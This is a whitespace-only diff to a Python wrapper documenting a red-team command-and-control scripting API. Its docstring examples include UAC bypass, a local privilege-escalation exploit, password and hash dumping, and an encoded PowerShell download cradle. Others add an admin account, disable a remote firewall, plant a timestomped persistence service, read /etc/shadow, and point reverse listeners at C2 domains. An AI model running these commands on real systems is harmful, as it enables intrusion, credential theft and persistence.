@@ -15,11 +15,11 @@ def is64(*args, fork=False):
     Example
     
     command x64 {
-    	foreach $session (beacons()) {
-    		if (-is64 $session['id']) {
-    			println($session);
-    		}
-    	}
+        foreach $session (beacons()) {
+            if (-is64 $session['id']) {
+                println($session);
+            }
+        }
     }
     """
 
@@ -34,11 +34,11 @@ def isadmin(*args, fork=False):
     Example
     
     command admin_sessions {
-    	foreach $session (beacons()) {
-    		if (-isadmin $session['id']) {
-    			println($session);
-    		}
-    	}
+        foreach $session (beacons()) {
+            if (-isadmin $session['id']) {
+                println($session);
+            }
+        }
     }
     """
 
@@ -53,11 +53,11 @@ def isbeacon(*args, fork=False):
     Example
     
     command beacons {
-    	foreach $session (beacons()) {
-    		if (-isbeacon $session['id']) {
-    			println($session);
-    		}
-    	}
+        foreach $session (beacons()) {
+            if (-isbeacon $session['id']) {
+                println($session);
+            }
+        }
     }
     """
 
@@ -72,11 +72,11 @@ def isssh(*args, fork=False):
     Example
     
     command ssh_sessions {
-    	foreach $session (beacons()) {
-    		if (-isssh $session['id']) {
-    			println($session);
-    		}
-    	}
+        foreach $session (beacons()) {
+            if (-isssh $session['id']) {
+                println($session);
+            }
+        }
     }
     """
 
@@ -152,7 +152,7 @@ def alias(*args, fork=False):
     Example
     
     alias("foo", {
-    	btask($1, "foo!");
+        btask($1, "foo!");
     });
     """
 
@@ -180,7 +180,7 @@ def archives(*args, fork=False):
     Example
     
     foreach $index => $entry (archives()) {
-    	println("\c3( $+ $index $+ )\o $entry");
+        println("\c3( $+ $index $+ )\o $entry");
     }
     """
 
@@ -318,10 +318,10 @@ def artifact_stageless(*args, fork=False):
     Example
     
     sub ready {
-    	local('$handle');
-    	$handle = openf(">out.exe");
-    	writeb($handle, $1);
-    	closef($handle);
+        local('$handle');
+        $handle = openf(">out.exe");
+        writeb($handle, $1);
+        closef($handle);
     }
     
     artifact_stageless("my listener", "exe", "x86", "", &ready);
@@ -464,10 +464,10 @@ def bbypassuac(*args, fork=False):
     Example
     
     item "&Bypass UAC" {
-    	openPayloadHelper(lambda({
-    		binput($bids, "bypassuac $1");
-    		bbypassuac($bids, $1);
-    	}, $bids => $1));
+        openPayloadHelper(lambda({
+            binput($bids, "bypassuac $1");
+            bbypassuac($bids, $1);
+        }, $bids => $1));
     }
     """
 
@@ -483,7 +483,7 @@ def bcancel(*args, fork=False):
     Example
     
     item "&Cancel Downloads" {
-    	bcancel($1, "*");
+        bcancel($1, "*");
     }
     """
 
@@ -500,8 +500,8 @@ def bcd(*args, fork=False):
     
     # create a command to change to the user's home directory
     alias home {
-    	$home = "c:\\users\\" . binfo($1, "user");
-    	bcd($1, $home);
+        $home = "c:\\users\\" . binfo($1, "user");
+        bcd($1, $home);
     }
     """
 
@@ -516,8 +516,8 @@ def bcheckin(*args, fork=False):
     Example
     
     item "&Checkin" {
-    	binput($1, "checkin");
-    	bcheckin($1);
+        binput($1, "checkin");
+        bcheckin($1);
     }
     """
 
@@ -626,7 +626,7 @@ def bdesktop(*args, fork=False):
     Example
     
     item "&Desktop (VNC)" {
-    	bdesktop($1);
+        bdesktop($1);
     }
     """
 
@@ -686,41 +686,41 @@ def bdllspawn(*args, silent=False, fork=False):
     This example is based on Stephen Fewer's Reflective DLL Injection Project:
     
     BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
-    	BOOL bReturnValue = TRUE;
-    	switch( dwReason ) {
-    		case DLL_QUERY_HMODULE:
-    			if( lpReserved != NULL )
-    				*(HMODULE *)lpReserved = hAppInstance;
-    			break;
-    		case DLL_PROCESS_ATTACH:
-    			hAppInstance = hinstDLL;
+        BOOL bReturnValue = TRUE;
+        switch( dwReason ) {
+            case DLL_QUERY_HMODULE:
+                if( lpReserved != NULL )
+                    *(HMODULE *)lpReserved = hAppInstance;
+                break;
+            case DLL_PROCESS_ATTACH:
+                hAppInstance = hinstDLL;
     
-    			/* print some output to the operator */
-    			if (lpReserved != NULL) {
-    				printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
-    			}
-    			else {
-    				printf("Hello from test.dll. There is no parameter\n");
-    			}
+                /* print some output to the operator */
+                if (lpReserved != NULL) {
+                    printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
+                }
+                else {
+                    printf("Hello from test.dll. There is no parameter\n");
+                }
     
-    			/* flush STDOUT */
-    			fflush(stdout);
+                /* flush STDOUT */
+                fflush(stdout);
     
-    			/* we're done, so let's exit */
-    			ExitProcess(0);
-    			break;
-    		case DLL_PROCESS_DETACH:
-    		case DLL_THREAD_ATTACH:
-    		case DLL_THREAD_DETACH:
-    			break;
-    	}
-    	return bReturnValue;
+                /* we're done, so let's exit */
+                ExitProcess(0);
+                break;
+            case DLL_PROCESS_DETACH:
+            case DLL_THREAD_ATTACH:
+            case DLL_THREAD_DETACH:
+                break;
+        }
+        return bReturnValue;
     }
     
     Example (Aggressor Script)
     
     alias hello {
-    	bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
+        bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
     }
     """
 
@@ -749,8 +749,8 @@ def bdrives(*args, fork=False):
     Example
     
     item "&Drives" {
-    	binput($1, "drives");
-    	bdrives($1);
+        binput($1, "drives");
+        bdrives($1);
     }
     """
 
@@ -797,13 +797,13 @@ def beacon_command_register(*args, fork=False):
     Example
     
     alis echo {
-    	blog($1, "You typed: " . substr($1, 5));
+        blog($1, "You typed: " . substr($1, 5));
     }
     
     beacon_command_register(
-    	"echo",
-    	"echo text to beacon log",
-    	"Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
+        "echo",
+        "echo text to beacon log",
+        "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
     """
 
     return engine.call('beacon_command_register', args, fork=fork)
@@ -853,10 +853,10 @@ def beacon_execute_job(*args, fork=False):
     Example
     
     alias shell {
-    	local('$args');
-    	$args = substr($0, 6);
-    	btask($1, "Tasked beacon to run: $args", "T1059");
-    	beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
+        local('$args');
+        $args = substr($0, 6);
+        btask($1, "Tasked beacon to run: $args", "T1059");
+        beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
     }
     """
 
@@ -893,23 +893,23 @@ def beacon_exploit_register(*args, fork=False):
     # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
     
     sub ms16_016_exploit {
-    	# check if we're on an x64 system and error out.
-    	if (-is64 $1) {
-    		berror($1, "ms16-016 exploit is x86 only");
-    		return;
-    	}
+        # check if we're on an x64 system and error out.
+        if (-is64 $1) {
+            berror($1, "ms16-016 exploit is x86 only");
+            return;
+        }
     
-    	# acknowledge this command
-    	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
+        # acknowledge this command
+        btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
     
-    	# generate our shellcode
-    	$stager = shellcode($2, false, "x86");
+        # generate our shellcode
+        $stager = shellcode($2, false, "x86");
     
-    	# spawn a Beacon post-ex job with the exploit DLL
-    	bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+        # spawn a Beacon post-ex job with the exploit DLL
+        bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
     
-    	# stage our payload (if this is a bind payload)
-    	bstage($1, $null, $2, $arch);
+        # stage our payload (if this is a bind payload)
+        bstage($1, $null, $2, $arch);
     }
     
     beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
@@ -947,23 +947,23 @@ def beacon_host_imported_script(*args, fork=False):
     Example
     
     alias powershell {
-    	local('$args $cradle $runme $cmd');
+        local('$args $cradle $runme $cmd');
     
-    	# $0 is the entire command with no parsing.
-    	$args   = substr($0, 11);
+        # $0 is the entire command with no parsing.
+        $args   = substr($0, 11);
     
-    	# generate the download cradle (if one exists) for an imported PowerShell script
-    	$cradle = beacon_host_imported_script($1);
+        # generate the download cradle (if one exists) for an imported PowerShell script
+        $cradle = beacon_host_imported_script($1);
     
-    	# encode our download cradle AND cmdlet+args we want to run
-    	$runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
+        # encode our download cradle AND cmdlet+args we want to run
+        $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
     
-    	# Build up our entire command line.
-    	$cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
+        # Build up our entire command line.
+        $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
     
-    	# task Beacon to run all of this.
-    	btask($1, "Tasked beacon to run: $args", "T1086");
-    	beacon_execute_job($1, "powershell", $cmd, 1);
+        # task Beacon to run all of this.
+        btask($1, "Tasked beacon to run: $args", "T1086");
+        beacon_execute_job($1, "powershell", $cmd, 1);
     }
     """
 
@@ -981,12 +981,12 @@ def beacon_host_script(*args, fork=False):
     Example
     
     alias test {
-    	local('$script $hosted');
-    	$script = "2 + 2";
-    	$hosted = beacon_host_script($1, $script);
+        local('$script $hosted');
+        $script = "2 + 2";
+        $hosted = beacon_host_script($1, $script);
     
-    	binput($1, "powerpick $hosted");
-    	bpowerpick($1, $hosted);
+        binput($1, "powerpick $hosted");
+        bpowerpick($1, $hosted);
     }
     """
 
@@ -1001,7 +1001,7 @@ def beacon_ids(*args, fork=False):
     Example
     
     foreach $bid (beacon_ids()) {
-    	println("Bid: $bid");
+        println("Bid: $bid");
     }
     """
 
@@ -1042,7 +1042,7 @@ def beacons(*args, fork=False):
     Example
     
     foreach $beacon (beacons()) {
-    	println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
+        println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
     }
     """
 
@@ -1059,10 +1059,10 @@ def belevate(*args, fork=False):
     Example
     
     item "&Elevate 31337" {
-    	openPayloadHelper(lambda({
-    		binput($bids, "elevate ms14-058 $1");
-    		belevate($bids, "ms14-058", $1);
-    	}, $bids => $1));
+        openPayloadHelper(lambda({
+            binput($bids, "elevate ms14-058 $1");
+            belevate($bids, "ms14-058", $1);
+        }, $bids => $1));
     }
     
     See Also
@@ -1081,7 +1081,7 @@ def berror(*args, fork=False):
     Example
     
     alias donotrun {
-    	berror($1, "You should never run this command!");
+        berror($1, "You should never run this command!");
     }
     """
 
@@ -1118,7 +1118,7 @@ def bexecute_assembly(*args, silent=False, fork=False):
     Example
     
     alias myutil {
-    	bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
+        bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
     }
     """
 
@@ -1133,8 +1133,8 @@ def bexit(*args, fork=False):
     Example
     
     item "&Die" {
-    	binput($1, "exit");
-    	bexit($1);
+        binput($1, "exit");
+        bexit($1);
     }
     """
 
@@ -1151,7 +1151,7 @@ def bgetprivs(*args, fork=False):
     Example
     
     alias debug {
-    	bgetprivs($1, "SeDebugPriv");
+        bgetprivs($1, "SeDebugPriv");
     }
     """
 
@@ -1166,8 +1166,8 @@ def bgetsystem(*args, fork=False):
     Example
     
     item "Get &SYSTEM" {
-    	binput($1, "getsystem");
-    	bgetsystem($1);
+        binput($1, "getsystem");
+        bgetsystem($1);
     }
     """
 
@@ -1194,8 +1194,8 @@ def bhashdump(*args, silent=False, fork=False):
     Example
     
     item "Dump &Hashes" {
-    	binput($1, "hashdump");
-    	bhashdump($1);
+        binput($1, "hashdump");
+        bhashdump($1);
     }
     """
 
@@ -1275,9 +1275,9 @@ def bipconfig(*args, fork=False):
     Example
     
     alias ipconfig {
-    	bipconfig($1, {
-    		blog($1, "Network information is:\n $+ $2");
-    	});
+        bipconfig($1, {
+            blog($1, "Network information is:\n $+ $2");
+        });
     }
     """
 
@@ -1320,7 +1320,7 @@ def bkerberos_ccache_use(*args, fork=False):
     Example
     
     alias kerberos_ccache_use {
-    	bkerberos_ccache_use($1, $2);
+        bkerberos_ccache_use($1, $2);
     }
     """
 
@@ -1335,7 +1335,7 @@ def bkerberos_ticket_purge(*args, fork=False):
     Example
     
     alias kerberos_ticket_purge {
-    	bkerberos_ticket_purge($1);
+        bkerberos_ticket_purge($1);
     }
     """
 
@@ -1351,7 +1351,7 @@ def bkerberos_ticket_use(*args, fork=False):
     Example
     
     alias kerberos_ticket_use {
-    	bkerberos_ticket_use($1, $2);
+        bkerberos_ticket_use($1, $2);
     }
     """
 
@@ -1410,7 +1410,7 @@ def blog(*args, fork=False):
     Example
     
     alias demo {
-    	blog($1, "I am output for the blog function");
+        blog($1, "I am output for the blog function");
     }
     """
 
@@ -1426,7 +1426,7 @@ def blog2(*args, fork=False):
     Example
     
     alias demo2 {
-    	blog2($1, "I am output for the blog2 function");
+        blog2($1, "I am output for the blog2 function");
     }
     """
 
@@ -1445,9 +1445,9 @@ def bloginuser(*args, fork=False):
     
     # make a token for a user with an empty password
     alias make_token_empty {
-    	local('$domain $user');
-    	($domain, $user) = split("\\\\", $2);]
-    	bloginuser($1, $domain, $user, "");
+        local('$domain $user');
+        ($domain, $user) = split("\\\\", $2);]
+        bloginuser($1, $domain, $user, "");
     }
     """
 
@@ -1462,8 +1462,8 @@ def blogonpasswords(*args, silent=False, fork=False):
     Example
     
     item "Dump &Passwords" {
-    	binput($1, "logonpasswords");
-    	blogonpasswords($1);
+        binput($1, "logonpasswords");
+        blogonpasswords($1);
     }
     """
 
@@ -1489,7 +1489,7 @@ def bls(*args, fork=False):
     Example
     
     on beacon_initial {
-    	bls($1, ".");
+        bls($1, ".");
     }
     """
 
@@ -1505,7 +1505,7 @@ def bmimikatz(*args, fork=False):
     Example
     
     alias coffee {
-    	bmimikatz($1, "standard::coffee");
+        bmimikatz($1, "standard::coffee");
     }
     """
 
@@ -1535,8 +1535,8 @@ def bmode(*args, fork=False):
     Example
     
     item "Mode DNS-TXT" {
-    	binput($1, "mode dns-txt");
-    	bmode($1, "dns-txt");
+        binput($1, "mode dns-txt");
+        bmode($1, "dns-txt");
     }
     """
 
@@ -1621,7 +1621,7 @@ def bnet(*args, silent=False, fork=False):
     # ladmins [target]
     #   find the local admins for a target
     alias ladmins {
-    	bnet($1, "localgroup", $2, "administrators");
+        bnet($1, "localgroup", $2, "administrators");
     }
     """
 
@@ -1667,7 +1667,7 @@ def bpause(*args, fork=False):
     Example
     
     alias pause {
-    	bpause($1, int($2));
+        bpause($1, int($2));
     }
     """
 
@@ -1701,7 +1701,7 @@ def bpowerpick(*args, silent=False, fork=False):
     
     # get the version of PowerShell available via Unmanaged PowerShell
     alias powerver {
-    	bpowerpick($1, '$PSVersionTable.PSVersion');
+        bpowerpick($1, '$PSVersionTable.PSVersion');
     }
     """
 
@@ -1718,7 +1718,7 @@ def bpowershell(*args, silent=False, fork=False):
     
     # get the version of PowerShell...
     alias powerver {
-    	bpowershell($1, '$PSVersionTable.PSVersion');
+        bpowershell($1, '$PSVersionTable.PSVersion');
     }
     """
 
@@ -1735,8 +1735,8 @@ def bpowershell_import(*args, silent=False, fork=False):
     
     # quickly run PowerUp
     alias powerup {
-    	bpowershell_import($1, script_resource("PowerUp.ps1"));
-    	bpowershell($1, "Invoke-AllChecks");
+        bpowershell_import($1, script_resource("PowerUp.ps1"));
+        bpowershell($1, "Invoke-AllChecks");
     }
     """
 
@@ -1756,22 +1756,22 @@ def bppid(*args, fork=False):
     
     # getexplorerpid($bid, &callback);
     sub getexplorerpid {
-    	bps($1, lambda({
-    		local('$pid $name $entry');
-    		foreach $entry (split("\n", $2)) {
-    			($name, $null, $pid) = split("\\s+", $entry);
-    			if ($name eq "explorer.exe") {
-    				[$callback: $1, $pid];
-    			}
-    		}
-    	}, $callback => $2));
+        bps($1, lambda({
+            local('$pid $name $entry');
+            foreach $entry (split("\n", $2)) {
+                ($name, $null, $pid) = split("\\s+", $entry);
+                if ($name eq "explorer.exe") {
+                    [$callback: $1, $pid];
+                }
+            }
+        }, $callback => $2));
     }
     
     alias prepenv {
-    	btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
-    	getexplorerpid($1, {
-    		bppid($1, $2);
-    	});
+        btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
+        getexplorerpid($1, {
+            bppid($1, $2);
+        });
     }
     """
 
@@ -1796,7 +1796,7 @@ def bps(*args, fork=False):
     Example
     
     on beacon_initial {
-    	bps($1);
+        bps($1);
     }
     """
 
@@ -1834,7 +1834,7 @@ def bpsexec_command(*args, fork=False):
     # disable the firewall on a remote target
     # beacon> shieldsdown [target]
     alias shieldsdown {
-    	bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
+        bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
     }
     """
 
@@ -1882,7 +1882,7 @@ def bpwd(*args, silent=False, fork=False):
     Example
     
     alias pwd {
-    	bpwd($1);
+        bpwd($1);
     }
     """
 
@@ -1899,7 +1899,7 @@ def breg_query(*args, fork=False):
     Example
     
     alias typedurls {
-    	breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
+        breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
     }
     """
 
@@ -1917,7 +1917,7 @@ def breg_queryv(*args, fork=False):
     Example
     
     alias winver {
-    	breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
+        breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
     }
     """
 
@@ -1932,7 +1932,7 @@ def brev2self(*args, fork=False):
     Example
     
     alias rev2self {
-    	brev2self($1);
+        brev2self($1);
     }
     """
 
@@ -2046,8 +2046,8 @@ def bscreenshot(*args, silent=False, fork=False):
     Example
     
     item "&Screenshot" {
-    	binput($1, "screenshot");
-    	bscreenshot($1, 0);
+        binput($1, "screenshot");
+        bscreenshot($1, 0);
     }
     """
 
@@ -2064,8 +2064,8 @@ def bsetenv(*args, fork=False):
     Example
     
     alias tryit {
-    	bsetenv($1, "foo", "BAR!");
-    	bshell($1, "echo %foo%");
+        bsetenv($1, "foo", "BAR!");
+        bshell($1, "echo %foo%");
     }
     """
 
@@ -2081,8 +2081,8 @@ def bshell(*args, silent=False, fork=False):
     Example
     
     alias adduser {
-    	bshell($1, "net user $2 B00gyW00gy1234! /ADD");
-    	bshell($1, "net localgroup \"Administrators\" $2 /ADD");
+        bshell($1, "net user $2 B00gyW00gy1234! /ADD");
+        bshell($1, "net localgroup \"Administrators\" $2 /ADD");
     }
     """
 
@@ -2130,8 +2130,8 @@ def bsleep(*args, silent=False, fork=False):
     Example
     
     alias stealthy {
-    	# sleep for 1 hour with 30% jitter factor
-    	bsleep($1, 60 * 60, 30);
+        # sleep for 1 hour with 30% jitter factor
+        bsleep($1, 60 * 60, 30);
     }
     """
 
@@ -2147,7 +2147,7 @@ def bsocks(*args, fork=False):
     Example
     
     alias socks1234 {
-    	bsocks($1, 1234);
+        bsocks($1, 1234);
     }
     """
 
@@ -2162,7 +2162,7 @@ def bsocks_stop(*args, fork=False):
     Example
     
     alias stopsocks {
-    	bsocks_stop($1);
+        bsocks_stop($1);
     }
     """
 
@@ -2179,10 +2179,10 @@ def bspawn(*args, fork=False):
     Example
     
     item "&Spawn" {
-    	openPayloadHelper(lambda({
-    		binput($bids, "spawn x86 $1");
-    		bspawn($bids, $1, "x86");
-    	}, $bids => $1));
+        openPayloadHelper(lambda({
+            binput($bids, "spawn x86 $1");
+            bspawn($bids, $1, "x86");
+        }, $bids => $1));
     }
     """
 
@@ -2223,8 +2223,8 @@ def bspawnto(*args, fork=False):
     
     # let's make everything lame.
     on beacon_initial {
-    	bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
-    	bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
+        bspawnto($1, "%windir%\\syswow64\\notepad.exe", "x86");
+        bspawnto($1, "%windir%\\sysnative\\notepad.exe", "x64");
     }
     """
 
@@ -2296,7 +2296,7 @@ def bstage(*args, fork=False):
     
     # stage [target] [listener name]
     alias stage {
-    	bstage($1, $2, $3, "x86");
+        bstage($1, $2, $3, "x86");
     }
     """
 
@@ -2312,7 +2312,7 @@ def bsteal_token(*args, fork=False):
     Example
     
     alias steal_token {
-    	bsteal_token($1, int($2));
+        bsteal_token($1, int($2));
     }
     """
 
@@ -2330,7 +2330,7 @@ def bsudo(*args, fork=False):
     
     # hashdump [password]
     ssh_alias hashdump {
-    	bsudo($1, $2, "cat /etc/shadow");
+        bsudo($1, $2, "cat /etc/shadow");
     }
     """
 
@@ -2348,7 +2348,7 @@ def btask(*args, fork=False):
     Example
     
     alias foo {
-    	btask($1, "User tasked beacon to foo", "T1015");
+        btask($1, "User tasked beacon to foo", "T1015");
     }
     """
 
@@ -2365,11 +2365,11 @@ def btimestomp(*args, silent=False, fork=False):
     Example
     
     alias persist {
-    	bcd($1, "c:\\windows\\system32");
-    	bupload($1, script_resource("evil.exe"));
-    	btimestomp($1, "evil.exe", "cmd.exe");
-    	bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
-    	bshell($1, 'sc start netsrv');
+        bcd($1, "c:\\windows\\system32");
+        bupload($1, script_resource("evil.exe"));
+        btimestomp($1, "evil.exe", "cmd.exe");
+        bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
+        bshell($1, 'sc start netsrv');
     }
     """
 
@@ -2429,8 +2429,8 @@ def bwdigest(*args, fork=False):
     Example
     
     item "Dump &Passwords (WDigest)" {
-    	binput($1, "wdigest");
-    	bwdigest($1);
+        binput($1, "wdigest");
+        bwdigest($1);
     }
     
     
@@ -2511,9 +2511,9 @@ def credential_add(*args, fork=False):
     Example
     
     command falsecreds {
-    	for ($x = 0; $x < 100; $x++) {
-    		credential_add("user $+ $x", "password $+ $x");
-    	}
+        for ($x = 0; $x < 100; $x++) {
+            credential_add("user $+ $x", "password $+ $x");
+        }
     }
     """
 
@@ -2541,8 +2541,8 @@ def data_keys(*args, fork=False):
     Example
     
     foreach $key (data_keys()) {
-    	println("\n\c4=== $key ===\n");
-    	println(data_query($key));
+        println("\n\c4=== $key ===\n");
+        println(data_query($key));
     }
     """
 
@@ -2605,8 +2605,8 @@ def dialog(*args, fork=False):
     Example
     
     sub callback {
-    	# prints: Pressed Go, a is: Apple
-    	println("Pressed $2 $+ , a is: " . $3['a']);
+        # prints: Pressed Go, a is: Apple
+        println("Pressed $2 $+ , a is: " . $3['a']);
     }
     
     $dialog = dialog("Hello World", %(a => "Apple", b => "Bat"), &callback);
@@ -2654,7 +2654,7 @@ def dispatch_event(*args, fork=False):
     Example
     
     dispatch_event({
-    	println("Hello World");
+        println("Hello World");
     });
     """
 
@@ -2980,7 +2980,7 @@ def fireAlias(*args, fork=False):
     
     # run the foo alias when a new Beacon comes in
     on beacon_initial {
-    	fireAlias($1, "foo", "bar!");
+        fireAlias($1, "foo", "bar!");
     }
     """
 
@@ -2996,7 +2996,7 @@ def fireEvent(*args, fork=False):
     Example
     
     on foo {
-    	println("Argument is: $1");
+        println("Argument is: $1");
     }
     
     fireEvent("foo", "Hello World!");
@@ -3089,10 +3089,10 @@ def host_info(*args, fork=False):
     
     # create a script console alias to dump host info
     command host {
-    	println("Host $1");
-    	foreach $key => $value (host_info($1)) {
-    		println("$[15]key $value");
-    	}
+        println("Host $1");
+        foreach $key => $value (host_info($1)) {
+            println("$[15]key $value");
+        }
     }
     """
 
@@ -3140,11 +3140,11 @@ def insert_menu(*args, fork=False):
     Example
     
     popup beacon {
-    	# menu definitions above this point
+        # menu definitions above this point
     
-    	insert_menu("beacon_bottom", $1);
+        insert_menu("beacon_bottom", $1);
     
-    	# menu definitions below this point
+        # menu definitions below this point
     }
     """
 
@@ -3231,12 +3231,12 @@ def listener_create(*args, fork=False):
     
     # create a foreign listener
     listener_create("My Metasploit", "windows/foreign_https/reverse_https",
-    		"ads.losenolove.com", 443);
+            "ads.losenolove.com", 443);
     
     # create an HTTP Beacon listener
     listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
-    		"www.losenolove.com", 80,
-    		"www.losenolove.com, www2.losenolove.com");
+            "www.losenolove.com", 80,
+            "www.losenolove.com, www2.losenolove.com");
     """
 
     return engine.call('listener_create', args, fork=fork)
@@ -3266,7 +3266,7 @@ def listener_describe(*args, fork=False):
     Example
     
     foreach $name (listeners()) {
-    	println("$name is: " . listener_describe($name));
+        println("$name is: " . listener_describe($name));
     }
     """
 
@@ -3292,10 +3292,10 @@ def listener_info(*args, fork=False):
     
     # create a script console alias to dump listener info
     command dump {
-    	println("Listener $1");
-    	foreach $key => $value (listener_info($1)) {
-    		println("$[15]key $value");
-    	}
+        println("Listener $1");
+        foreach $key => $value (listener_info($1)) {
+            println("$[15]key $value");
+        }
     }
     """
 
@@ -3318,16 +3318,16 @@ def listener_pivot_create(*args, fork=False):
     # create a pivot listener:
     # $1 = beaconID, $2 = name, $3 = port
     alias plisten {
-    	local('$lhost $bid $name $port');
+        local('$lhost $bid $name $port');
     
-    	# extract our arguments
-    	($bid, $name, $port) = @_;
+        # extract our arguments
+        ($bid, $name, $port) = @_;
     
-    	# get the name of our target
-    	$lhost = beacon_info($1, "computer");
+        # get the name of our target
+        $lhost = beacon_info($1, "computer");
     
-    	btask($1, "create TCP listener on $lhost $+ : $+ $port");
-    	listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
+        btask($1, "create TCP listener on $lhost $+ : $+ $port");
+        listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
     }
     """
 
@@ -3405,7 +3405,7 @@ def nextTab(*args, fork=False):
     Example
     
     bind Ctrl+Right {
-    	nextTab();
+        nextTab();
     }
     """
 
@@ -3421,7 +3421,7 @@ def on(*args, fork=False):
     Example
     
     sub foo {
-    	blog($1, "Foo!");
+        blog($1, "Foo!");
     }
     
     on("beacon_initial", &foo);
@@ -3482,10 +3482,10 @@ def openBeaconConsole(*args, fork=False):
     Example
     
     item "Interact" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openBeaconConsole($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openBeaconConsole($bid);
+        }
     }
     """
 
@@ -3500,10 +3500,10 @@ def openBrowserPivotSetup(*args, fork=False):
     Example
     
     item "Browser Pivoting" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openBrowserPivotSetup($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openBrowserPivotSetup($bid);
+        }
     }
     """
 
@@ -3518,10 +3518,10 @@ def openBypassUACDialog(*args, fork=False):
     Example
     
     item "Bypass UAC" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openBypassUACDialog($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openBypassUACDialog($bid);
+        }
     }
     """
 
@@ -3558,10 +3558,10 @@ def openCovertVPNSetup(*args, fork=False):
     Example
     
     item "VPN Pivoting" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openCovertVPNSetup($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openCovertVPNSetup($bid);
+        }
     }
     """
 
@@ -3598,10 +3598,10 @@ def openElevateDialog(*args, fork=False):
     Example
     
     item "Elevate" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openElevateDialog($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openElevateDialog($bid);
+        }
     }
     """
 
@@ -3627,10 +3627,10 @@ def openFileBrowser(*args, fork=False):
     Example
     
     item "Browse Files" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openFileBrowser($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openFileBrowser($bid);
+        }
     }
     """
 
@@ -3645,10 +3645,10 @@ def openGoldenTicketDialog(*args, fork=False):
     Example
     
     item "Golden Ticket" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openGoldenTicketDialog($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openGoldenTicketDialog($bid);
+        }
     }
     """
 
@@ -3754,10 +3754,10 @@ def openMakeTokenDialog(*args, fork=False):
     Example
     
     item "Make Token" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openMakeTokenDialog($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openMakeTokenDialog($bid);
+        }
     }
     """
 
@@ -3783,10 +3783,10 @@ def openOrActivate(*args, fork=False):
     Example
     
     item "&Activate" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openOrActivate($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openOrActivate($bid);
+        }
     }
     """
 
@@ -3812,7 +3812,7 @@ def openPayloadHelper(*args, fork=False):
     Example
     
     openPayloadHelper(lambda({
-    	bspawn($bid, $1);
+        bspawn($bid, $1);
     }, $bid => $1));
     """
 
@@ -3827,10 +3827,10 @@ def openPivotListenerSetup(*args, fork=False):
     Example
     
     item "Listener..." {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openPivotListenerSetup($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openPivotListenerSetup($bid);
+        }
     }
     """
 
@@ -3858,10 +3858,10 @@ def openPortScannerLocal(*args, fork=False):
     Example
     
     item "Scan" {
-    	local('$bid');
-    	foreach $bid ($1) {
-    		openPortScannerLocal($bid);
-    	}
+        local('$bid');
+        foreach $bid ($1) {
+            openPortScannerLocal($bid);
+        }
     }
     """
 
@@ -3898,7 +3898,7 @@ def openProcessBrowser(*args, fork=False):
     Example
     
     item "Processes" {
-    	openProcessBrowser($1);
